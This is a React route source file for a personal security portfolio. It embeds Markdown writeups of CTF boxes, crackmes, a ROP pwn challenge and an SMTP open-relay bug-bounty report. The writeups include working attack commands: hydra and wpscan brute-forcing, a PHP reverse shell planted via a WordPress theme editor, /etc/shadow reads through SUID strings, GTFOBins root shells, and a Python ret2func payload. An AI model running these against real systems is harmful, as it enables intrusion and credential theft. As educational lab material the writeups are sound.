import { createFileRoute, Link, notFound } from "@tanstack/react-router";
import { Reveal } from "@/components/Reveal";
import { ArrowLeft, Calendar, Tag } from "lucide-react";

type Post = {
  slug: string;
  title: string;
  date: string;
  tags: string[];
  body: string;
};

const POSTS: Record<string, Post> = {
  "snapchat-smtp-open-relay": {
    slug: "snapchat-smtp-open-relay",
    title: "Snapchat SMTP Open Relay Vulnerability",
    date: "2025-05-15",
    tags: ["smtp", "bug bounty", "email security", "reconnaissance"],
    body: `During a bug bounty engagement, I discovered an SMTP open relay vulnerability on beta.snappublisher.snapchat.com. This allowed unauthenticated users to send email through Snapchat's infrastructure.

## Proof-of-Concept

\`\`\`
telnet beta.snappublisher.snapchat.com 25
220 beta.snappublisher.snapchat.com ESMTP
HELO attacker.com
250 beta.snappublisher.snapchat.com
MAIL FROM:<test@external.com>
250 OK
RCPT TO:<recipient@gmail.com>
250 OK
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Test Message

This is a test message.
.
250 OK
\`\`\`

The server successfully relayed the message, confirming the vulnerability. I reported this to Snapchat with a video PoC and recommended restricting SMTP relay to authenticated users only.

## Impact

This vulnerability could be abused for phishing or large-scale spam campaigns, posing a significant risk to brand reputation and user trust.

## Recon Tools Used

Subfinder, httpx, swaks.

## Key Takeaway

A full bug bounty workflow — from reconnaissance and exploitation to responsible disclosure and reporting.`,
  },
  "tryhackme-three-season-streak": {
    slug: "tryhackme-three-season-streak",
    title: "TryHackMe Leaderboards: 1st Place Across Three Seasons",
    date: "2025-09-01",
    tags: ["tryhackme", "red team", "achievements"],
    body: `Achieved 1st place globally on TryHackMe leaderboards across three competitive seasons, demonstrating consistency, discipline, and advanced offensive security capabilities.

## Achievements

- **Bronze League** — 1st Place (rarity 5.2%)
- **Gold League** — 1st Place (rarity 1.7%)
- **Sapphire League** — 1st Place (rarity 0.8%, Epic Tier)

These rankings reflect sustained hands-on practice in real-world attack simulations, including enumeration, exploitation, privilege escalation, and post-exploitation across diverse lab environments.

## Focus Areas

- Web and Network Exploitation
- Privilege Escalation
- Active Directory Labs
- Red Team Methodology

## Takeaway

Consistency outweighs short-term effort. Structured learning, daily practice, and an offensive mindset are the key drivers of top-tier performance on competitive security platforms.`,
  },
  "journey-into-red-teaming": {
    slug: "journey-into-red-teaming",
    title: "My Journey into Red Teaming",
    date: "2025-05-20",
    tags: ["red teaming", "learning", "engineering"],
    body: `My journey into red teaming has been both demanding and rewarding while pursuing a degree in Communications and Electronics Engineering. Balancing an intensive academic workload with hands-on cybersecurity practice has shaped my learning approach and time management skills.

Unlike traditional penetration testing, red teaming focuses on emulating real-world adversaries to evaluate an organization's overall security posture. My interest in this field grew naturally from my engineering background, where low-level system understanding is essential.

## Key Challenges

- Balancing engineering coursework with cybersecurity learning
- Frequent context switching between theory-heavy subjects and practical labs
- Limited time requiring depth-focused learning strategies
- Self-directed study due to the absence of red teaming in academic curricula

## Validation Through Competition

- **CyberTalents** — Ranked 20th out of 250 participants
- **CyShield** — Top 100 placement

These experiences strengthened my analytical thinking, persistence, and ability to learn complex systems efficiently.

## Looking Ahead

I'm actively preparing for future competitions and challenges, including upcoming CyberTalents editions, Zinad cybersecurity competitions, and advanced red team simulation labs currently in progress.

Each milestone reinforces my commitment to mastering offensive security through strong engineering fundamentals and continuous learning.`,
  },
  "chainbreaker-re": {
    slug: "chainbreaker-re",
    title: "Chainbreaker (RE) — Iterative State Cracking",
    date: "2025-10-20",
    tags: ["reverse engineering", "ghidra", "crackme", "ctf"],
    body: `The binary takes a single integer SEED, computes a number of iterations N = required_links(seed), then repeatedly applies parse(seed, state, i) for N steps. It only succeeds if the final state is exactly the original seed.

## Recon

Without exactly one argument it prints "usage: ./chainbreaker SEED" and exits. Otherwise main() reads argv[1] as a decimal integer, derives N from a small arithmetic expression on the seed, then runs a feedback loop where each iteration sleeps for max(state, 0) milliseconds.

## Renaming in Ghidra

Renaming variables makes the decompile readable: param_1 → argc, param_2 → argv, local_2c → seed, local_1c → chain_state, local_20 → required_links, local_24 → step_idx. Inside parse(): param_2 → current_state, param_3 → step_idx, local_20 → state_mod, local_c → xor_mix.

## The math

required_links(seed) is computed as:

\`\`\`c
req = (int)(((seed ^ 0x141) + (seed ^ 0x7b)) * 0x533d) % 100;
if (req < 0) req = -req;
else if (req == 0) req = 10;
\`\`\`

So N is bounded to 1..99 — small enough to brute-force.

parse() normalizes current_state into a window, builds a small mixing term xor_mix = 1 ^ s ^ (s<<1) ^ (s<<2), then returns:

\`\`\`c
next = seed + (((step_idx + seed) - 1) ^ state_mod) + xor_mix - 0x0F;
\`\`\`

## Solver strategy

For each candidate seed in a range: compute N like the C code, simulate parse_step N times, check if final state == seed. Done. The trick is matching C's signed/unsigned arithmetic exactly — int32 wrap, uint32 cast, and C-style remainder for negatives.

## Result

Brute-forcing the range -20000..20000 found seed = -11478 with 72 links. Running ./chainbreaker -11478 prints all 72 transitions and ends with "You have broken the chain!".

## Lessons

- Always rename Ghidra variables before reasoning about logic.
- Reproduce C integer semantics carefully when porting to Python.
- A small modulo (% 100) is a giant hint that brute-force is intended.`,
  },
  "crowdsecurity-auth": {
    slug: "crowdsecurity-auth",
    title: "CrowdSecurity Auth — Algebraic Reversal",
    date: "2025-10-12",
    tags: ["reverse engineering", "radare2", "ghidra"],
    body: `An ELF 64-bit auth crackme. The binary asks for a username and a password, then validates the password against the username using a custom per-character formula. Target username: CrowdSecurity.

## Recon

radare2 with -A and \`iz\` revealed the prompts, "Good Job", and "Access denied!!" strings. \`afl ~main\` pointed at main at 0x130b.

## Decompiled logic

The wrapper allocates two 0x32 (50-byte) buffers via malloc, scanf("%s", ...) twice, then calls FUN_001011e9 — the verifier.

The verifier holds a hardcoded table of 13 ints (0x74, 0x143, 0x21b, 0x334, 0x3a1, 0x456, 0x50b, 0x63c, 0x719, 0x889, 0x915, 0x76b, 0x85c) and loops:

\`\`\`c
if (((u + p) * (i + 1) - u) + i != L[i]) return 0;
\`\`\`

## Reversing the equation

Each character is independent — a major weakness. Solving for p:

((u + p) * (i + 1) - u) + i = L
(u + p) * (i + 1) = L - i + u
u + p = (L - i + u) / (i + 1)
p = ((L - i + u) / (i + 1)) - u

## Solver

A 10-line Python script iterates the 13 indices, computes p_ascii = ((L - i + u) // (i + 1)) - u, and prints the password character by character.

## Result

Username: CrowdSecurity
Password: thisisapass34

## Takeaway

Custom validation routines without inter-character coupling collapse to N independent linear equations. If you can write the formula on paper, you can solve the password without ever running John or hashcat.`,
  },
  "jack-of-all-trades": {
    slug: "jack-of-all-trades",
    title: "Jack-of-All-Trades — Ports, Stego, and SUID Strings",
    date: "2025-09-22",
    tags: ["ctf", "tryhackme", "stego", "ssh", "suid"],
    body: `A TryHackMe box that swaps service ports and hides credentials in image steganography.

## Recon

\`nmap -sV -sC -v -T4 10.10.139.170\` showed two oddities: HTTP on 22 and OpenSSH 6.7p1 on 80 — ports deliberately swapped.

## Web layer

The page on port 22 had title "Jack-of-all-trades!" — a username hint. View-source on /recovery.php exposed a base64 string in HTML comments which decoded to a hint mentioning Johny Graves and the password "u?WtKSraq". Searching Johny Graves surfaced his "favourite crypto method": ROT13 → Hex → Base32. Reversing that on other comments confirmed the chain.

## Steganography

\`steghide extract -sf header.jpg\` (no passphrase) yielded cms.creds:

Username: jackinthebox
Password: TplFxiSHjY

stego.jpg with the earlier password gave a "right path, wrong image" red herring.

## Web shell + SSH

The recovery panel exposed a /nnxhweOV/index.php?cmd= endpoint — direct command execution. Reading /home/jacks_password_list gave a list to feed hydra:

\`hydra -l jack -P password.txt ssh://10.10.139.170:80 -V\`

Found: ITMJpGGIqg1jn?>@. SSH on port 80: \`ssh -p 80 jack@10.10.139.170\`. user.jpg base64-decoded into a "Penguin Soup recipe" containing the user flag securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}.

## Privesc — SUID strings

\`find / -perm -4000 -type f 2>/dev/null\` showed /usr/bin/strings as SUID. strings can read any file as root:

\`/usr/bin/strings /etc/shadow\` — leaked hashes
\`/usr/bin/strings /root/root.txt\` — root flag securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}

## Lessons

Always check non-standard ports, treat every image as a potential stego container, and remember that read-only SUID binaries (strings, less, more, find) are full file disclosure primitives.`,
  },
  "cybertalents-practice-bash": {
    slug: "cybertalents-practice-bash",
    title: "CyberTalents — Practice Bash Walkthrough",
    date: "2025-10-17",
    tags: ["ctf", "cybertalents", "bash", "stego", "zip cracking"],
    body: `A CyberTalents Linux challenge built around nested archives, zip cracking, binary string analysis, and base64 decoding.

## Stage 1 — initial archive

\`tar -xzf linux_chal.tar.gz\` extracts a "cat" folder. \`cat .pass.txt\` reveals 2434237800, the password for exec.zip. Inside: an executable "-" and ascii.zip.

## Stage 2 — failed brute force

zip2john on ascii.zip produced a hash but rockyou.txt did not crack it. hashcat -m 13600 errored out, fcrackzip hit its 8-file limit. Time to look elsewhere.

## Stage 3 — strings on the binary

Renaming - to dash_file and running \`strings -n 6 dash_file\` revealed the embedded password: 'passforasciiii'. Unzipped ascii.zip → files f0..f8 (mostly raw bytes) plus size37.zip.

## Stage 4 — finding the next password

\`for f in f*; do file "$f"; done\` flagged f6 as plain ASCII. \`strings f6\` printed: thissssisssthepasswordfornexxtfileeee — actually \`thisisasciiiiiprintapleeeee\` — the password for size37.zip.

## Stage 5 — wordlist + grep

size37.zip extracted test1..test7 plus next.zip. Only test5 was plaintext: "thissssisssthepasswordfornexxtfileeee". next.zip opened with that, yielding nexttocybertalents (a wordlist) and NumberOne.zip.

\`grep cybertalents nexttocybertalents\` → cybertalentsorderby1337 (NumberOne.zip password).

## Stage 6 — final base64

zip2john + john --wordlist=one cracked decodeme1.zip with password "infrastructure". Inside, a base64 string in 'pass' decoded to "usemeaspassword" — the key for decodeme2.zip and the final flag.

## Lessons

When automated cracking fails, switch tools — strings on a binary often hands you the password directly. Pattern: each archive's password is hidden in the previous archive's extracted content.`,
  },
  "mr-robot-ctf": {
    slug: "mr-robot-ctf",
    title: "Mr Robot CTF — WordPress to Root via SUID nmap",
    date: "2025-08-14",
    tags: ["ctf", "tryhackme", "wordpress", "wpscan", "privesc"],
    body: `Three keys hidden across a Mr Robot themed WordPress box at 10.10.54.238.

## Recon

\`nmap -sC -sV -T4 -v 10.10.54.238\` — ports 22 (SSH), 80 (Apache), 443 (Apache). Apache hosts WordPress 4.3.1.

## Directory enumeration

\`gobuster dir -u http://10.10.54.238/ -w directory-list-2.3-medium.txt -t 50 -x php,txt,html\` found /admin, /wp-admin, /wp-includes, /login, /robots.txt, /license.txt.

robots.txt → /key-1-of-3.txt = 073403c8a58a1f80d943455fb30724b9
robots.txt also pointed at fsocity.dic — a credential wordlist.

## Brute-forcing WordPress

The wordlist had heavy duplication. Filter:

\`sort fsocity.dic | uniq -c | awk '$1 <= 10 {print $2}' > fsocity_filtered_unique.txt\`

\`wpscan --url http://10.10.54.238/ --usernames user.txt --passwords fsocity_filtered_unique.txt\`

Cracked: Elliot / ER28-0652.

## Reverse shell via theme editor

Logged in as Elliot, edited 404.php in the TwentyFifteen theme, pasted php-reverse-shell.php with LHOST/LPORT set. Triggered via /wp-includes/themes/TwentyFifteen/404.php (or /asdfgh which redirects there).

\`nc -lvnp 8888\` caught the shell as user daemon. Upgraded TTY: \`python3 -c 'import pty; pty.spawn("/bin/bash")'\`.

## Key 2

/home/robot/ contained key-2-of-3.txt (no read perms as daemon) and password.raw-md5: robot:c3fcd3d76192e4007dfb496cca67e13b.

\`john --format=raw-md5 --wordlist=rockyou.txt hash.txt\` cracked it instantly: abcdefghijklmnopqrstuvwxyz.

\`su robot\` → cat key-2-of-3.txt = 822c73956184f694993bede3eb39f959.

## Privesc — SUID nmap

\`find / -perm -4000 -type f 2>/dev/null\` showed /usr/local/bin/nmap. Old nmap (≤5.21) supports interactive mode with shell escape:

\`nmap --interactive\`
\`!sh\`

Root shell. /root/key-3-of-3.txt = 04787ddef27c3dee1ee161b21670b4e4.

## Takeaway

WordPress + dictionary credentials + theme editor is a classic chain. SUID binaries on legacy nmap remain a textbook GTFOBins escalation.`,
  },
  "tryhackme-tomcat-ghostcat": {
    slug: "tryhackme-tomcat-ghostcat",
    title: "TryHackMe Tomcat — Ghostcat (CVE-2020-1938)",
    date: "2025-08-29",
    tags: ["ctf", "tryhackme", "ghostcat", "cve-2020-1938", "gpg"],
    body: `Apache Tomcat 9.0.30 with the AJP connector exposed on 8009 — the textbook Ghostcat scenario.

## Recon

nmap on 10.10.203.113: 22 (OpenSSH 7.2p2), 53 (tcpwrapped), 8009 (AJP 1.3), 8080 (Tomcat 9.0.30).

gobuster surfaced /docs, /examples, /manager.

## Exploitation — CVE-2020-1938

Metasploit module:

\`\`\`
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.10.200.166
run
\`\`\`

Default FILENAME /WEB-INF/web.xml leaked the description block:

\`\`\`
Welcome to GhostCat
skyfuck:8730281lkjlkjdqlksalks
\`\`\`

## Initial foothold

\`ssh skyfuck@10.10.200.166\` — in. Home contained credential.pgp and tryhackme.asc.

## PGP key cracking

\`gpg --import tryhackme.asc\`
\`gpg2john tryhackme.asc > hash.txt\`
\`john --wordlist=rockyou.txt hash.txt\` → passphrase: alexandru.

\`gpg --decrypt credential.pgp\` →
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

\`su merlin\` → user flag THM{GhostCat_1s_so_cr4sy}.

## Privesc — sudo zip

\`sudo -l\` revealed (root : root) NOPASSWD: /usr/bin/zip. GTFOBins:

\`\`\`
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
\`\`\`

Root shell. /root/root.txt = THM{Z1P_1S_FAKE}.

A cron job also runs /root/ufw/ufw.sh as root every minute — overwriting it with a reverse shell payload is an alternate persistence path.

## Lessons

AJP on the public network is a file-disclosure primitive. Sudo on archive utilities (zip, tar) almost always means a root shell via their command-execution flags.`,
  },
  "0xl0ccedc0de-revenge": {
    slug: "0xl0ccedc0de-revenge",
    title: "0xL0CCEDC0DE'S REVENGE — Multi-Stage Pwn",
    date: "2025-11-02",
    tags: ["binary exploitation", "format string", "rop", "ret2func"],
    body: `A multi-stage exploitation challenge: format string → integer logic → heap overflow → stack overflow + ret2func chain → menu logic.

## Recon

\`pwn checksec\`: amd64, No PIE, Partial RELRO, NX enabled, no canary, IBT/SHSTK on. No PIE means static addresses — ideal for ret2func.

## Stage0 — format string

stage0() mmaps a page at 0x70707000, computes target = base + 0x70 = 0x70707070, then calls printf(input). Goal: write any non-zero byte to 0x70707070.

Dumping %1$p..%100$p found 0x70707070 at argument index 38. Smallest write primitive — one byte:

\`A%38$hhn\`

The "A" makes printed_chars = 1 so %hhn writes 0x01 instead of 0x00.

## Stage1 — integer trap

The check is: state >= 0x1001 → "not allowed", state < 0x1000 → "not enough power". Only valid value: 0x1000 = 4096.

## Stage2 — heap overflow

scanf("%s", pcVar3) into a fixed strdup buffer. The next strdup ("0xL0CCED") sits adjacent. Cyclic of 40 chars showed offset 32 to overwrite the second buffer. Required value: "0P3N" (zero-P-3-N).

Payload: 32 bytes of padding + "0P3N".

## Stage3 — stack overflow + ret2func

gets() into a 10-byte buffer; offset to RIP = 18. Helpful functions exist:

stage3_solver0 at 0x4014c8 — calls malloc(0x64), stores in [msg], sets RDI=msg, RSI="PLEASE OPEN!"
stage3_solver1 at 0x4014f8 — strcpy(msg, open) then strcmp

Crucially solver0 sets up solver1's arguments. So the chain is just: padding + ret + solver0 + ret + solver1.

## Pitfalls

1. Inserting a dummy "BBBBBBBB" between solver0 and solver1 fails — solver0's epilogue already pops rbp, so the next 8 bytes become the return address. Don't pad between calls.

2. movaps inside malloc/scanf crashed because RSP wasn't 16-byte aligned. Inserting a single \`ret\` gadget (0x40101a) before each call fixed alignment.

## Final exploit

\`\`\`python
from struct import pack
OFFSET = 18
RET    = 0x40101a
SOLVER0= 0x4014c8
SOLVER1= 0x4014f8
payload  = b"A" * OFFSET
payload += pack("<Q", RET) + pack("<Q", SOLVER0)
payload += pack("<Q", RET) + pack("<Q", SOLVER1)
\`\`\`

## Ending — menu logic

ending() loops until local_10 == "Youre" and local_18 == "Me". Direct entry frees the buffer to NULL — must rely on stdin sequencing. Driver script piped all stage inputs in sequence. Final output: "I am Agent 1337 and I made 0xL0CCEDC0DE".

## Lessons

- Bash \`printf\` mangles %hhn — use Python or echo carefully.
- ret2func chains break stack alignment — keep a ret gadget handy.
- Function epilogues with pop rbp eat your dummy values.`,
  },
  "ascii-crackme": {
    slug: "ascii-crackme",
    title: "ascii — Position-Shift Crackme",
    date: "2025-09-30",
    tags: ["reverse engineering", "ghidra", "crackme"],
    body: `A small reverse engineering crackme: the binary doesn't compare your input directly — it encodes it first, then compares against a hidden global string.

## main()

Expects exactly one argv. For each character it calls encode(*pcVar3, '\\x06' - i) and appends the result to an output string, then passes that to verify(). On match: "You cracked me!".

## encode()

\`\`\`c
char encode(char c, char k) { return c + k; }
\`\`\`

So per index i: encoded[i] = input[i] + (6 - i). The shift sequence: +6, +5, +4, +3, +2, +1, +0, -1, -2, -3...

## verify()

Decompiled to a thin std::operator== wrapper. The assembly showed:

\`\`\`
LEA RDX,[encoded_flag]
CALL std::operator==
\`\`\`

So the comparison target is a global C++ string named encoded_flag, initially zero in .bss — meaning it's filled during static initialization.

## Recovering the target

Following _GLOBAL__sub_I_encoded_flag → __static_initialization_and_destruction_0 led to:

\`\`\`
std::__cxx11::string::string(encoded_flag, "IYJ~U4cQ1Q[<mL[(U;\`'Ynk/M-i", &local_29);
\`\`\`

## Inverting the transform

input[i] = encoded[i] - (6 - i)

Applied to "IYJ~U4cQ1Q[<mL[(U;\`'Ynk/M-i" yields:

CTF{S3cR3T_AsSc1_Fl4g}{@_@}

## Verification

\`./ascii 'CTF{S3cR3T_AsSc1_Fl4g}{@_@}'\` → "You cracked me!".

## Lessons

When verify() looks empty, follow the assembly to find the comparison target. Globals initialized as C++ string objects live in .bss but get populated by per-translation-unit initializer functions — chase those to recover the bytes.`,
  },
};

export const Route = createFileRoute("/writeups/$slug")({
  loader: ({ params }) => {
    const post = POSTS[params.slug];
    if (!post) throw notFound();
    return { post };
  },
  head: ({ loaderData }) => ({
    meta: loaderData
      ? [
          { title: `${loaderData.post.title} — Writeups — Mostafa Galal` },
          { name: "description", content: loaderData.post.body.slice(0, 160) },
          { property: "og:title", content: `${loaderData.post.title} — Mostafa Galal` },
          { property: "og:description", content: loaderData.post.body.slice(0, 160) },
        ]
      : [{ title: "Writeup — Mostafa Galal" }],
  }),
  notFoundComponent: () => (
    <div className="mx-auto max-w-3xl px-4 py-32 text-center sm:px-6">
      <div className="font-mono text-xs uppercase tracking-[0.25em] text-cyber-cyan">
        err::404
      </div>
      <h1 className="mt-4 font-display text-4xl font-bold">Writeup not found</h1>
      <Link
        to="/writeups"
        className="mt-6 inline-flex items-center gap-2 rounded-full px-4 py-2 font-mono text-xs uppercase tracking-wider text-cyber-cyan glass-panel gradient-border"
      >
        <ArrowLeft className="h-3.5 w-3.5" /> back to writeups
      </Link>
    </div>
  ),
  component: WriteupDetail,
});

function WriteupDetail() {
  const { post } = Route.useLoaderData();

  return (
    <article className="mx-auto max-w-3xl px-4 py-16 sm:px-6">
      <Reveal>
        <Link
          to="/writeups"
          className="inline-flex items-center gap-2 font-mono text-xs uppercase tracking-wider text-cyber-cyan"
        >
          <ArrowLeft className="h-3.5 w-3.5" /> back to writeups
        </Link>
      </Reveal>

      <Reveal delay={0.1}>
        <div className="mt-8 flex flex-wrap items-center gap-4 font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
          <span className="inline-flex items-center gap-1">
            <Calendar className="h-3 w-3" /> {post.date}
          </span>
          <span className="inline-flex items-center gap-1 text-cyber-cyan">
            <Tag className="h-3 w-3" /> {post.tags.join(" / ")}
          </span>
        </div>
        <h1 className="mt-3 font-display text-4xl font-bold leading-tight sm:text-5xl">
          {post.title}
        </h1>
      </Reveal>

      <Reveal delay={0.15}>
        <div className="prose prose-invert mt-10 max-w-none space-y-5 text-foreground/85">
          {post.body.split("\n\n").map((block: string, i: number) => {
            if (block.startsWith("## ")) {
              return (
                <h2
                  key={i}
                  className="mt-8 font-display text-2xl font-semibold text-foreground"
                >
                  {block.replace(/^##\s/, "")}
                </h2>
              );
            }
            if (block.startsWith("```")) {
              const code = block.replace(/^```[a-z]*\n?/, "").replace(/```$/, "");
              return (
                <pre
                  key={i}
                  className="overflow-x-auto rounded-xl p-4 font-mono text-xs glass-panel gradient-border"
                >
                  <code>{code}</code>
                </pre>
              );
            }
            if (block.startsWith("- ")) {
              return (
                <ul key={i} className="ml-5 list-disc space-y-1.5">
                  {block.split("\n").map((li: string, j: number) => (
                    <li key={j}>{li.replace(/^-\s/, "")}</li>
                  ))}
                </ul>
              );
            }
            return (
              <p key={i} className="leading-relaxed">
                {block}
              </p>
            );
          })}
        </div>
      </Reveal>
    </article>
  );
}
